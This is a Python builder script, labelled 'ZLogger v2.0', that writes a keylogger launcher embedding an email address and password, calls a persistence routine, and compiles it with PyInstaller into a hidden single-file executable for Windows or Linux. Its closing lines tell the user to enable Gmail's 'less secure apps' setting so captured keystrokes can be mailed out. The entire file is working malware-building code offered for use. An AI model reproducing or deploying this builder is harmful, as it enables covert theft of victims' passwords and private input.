#!/usr/bin/env python
import argparse
import subprocess
import os


WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser("~/.wine/drive_c/Python27/Scripts/pyinstaller.exe")

def get_arguments():
    parser = argparse.ArgumentParser(description='ZLogger v2.0')
    parser._optionals.title = "Optional Arguments"
    parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds.", default=120)
    parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
    parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')

    required_arguments = parser.add_argument_group('Required Arguments')
    required_arguments.add_argument("-e", "--email", dest="email", help="Email address to send reports to.")
    required_arguments.add_argument("-p", "--password", dest="password", help="Password for the email address given in the -e argument.")
    required_arguments.add_argument("-o", "--out", dest="out", help="Output file name.", required=True)
    return parser.parse_args()

def create_keylogger(file_name, interval, email, password):
    with open(file_name, "w+") as file:
        file.write("import keylogger\n")
        file.write("zlogger = keylogger.Keylogger(" + interval + ",'" + email + "','" + password + "')\n")
        file.write("zlogger.become_persistent()\n")
        file.write("zlogger.start()\n")

def compile_for_windows(file_name):
    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name])

def compile_for_linux(file_name):
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])

arguments = get_arguments()
create_keylogger(arguments.out, arguments.interval, arguments.email, arguments.password)

if arguments.windows:
    compile_for_windows(arguments.out)

if arguments.linux:
    compile_for_linux(arguments.out)

print("\n\n[***] Don't forget to allow less secure applications in your Gmail account.")
print("Use the following link to do so https://myaccount.google.com/lesssecureapps")
